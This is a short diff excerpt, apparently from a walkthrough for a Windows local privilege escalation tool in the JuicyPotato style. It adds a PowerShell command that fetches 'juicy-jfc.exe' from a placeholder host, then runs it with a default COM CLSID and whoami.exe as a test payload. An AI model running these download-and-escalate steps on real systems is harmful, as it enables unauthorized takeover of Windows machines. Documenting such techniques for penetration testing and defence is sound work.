@@ -68,6 +68,9 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 
+> PS C:\Users\Public\Documents> WGET http://X.X.X.X/juicy-jfc.exe -outfile juicy-jfc.exe 
+
+
 ==> First we test the local privilege escalation without indicating a CLSID (so the one by default '{4991d34b-80a1-4291-83b6-3328366b9097}' will be tested). 
     
 > PS C:\Users\Public\Documents> ./juicy-jfc.exe -l 8888 -p c:\Windows\System32\whoami.exe -t *
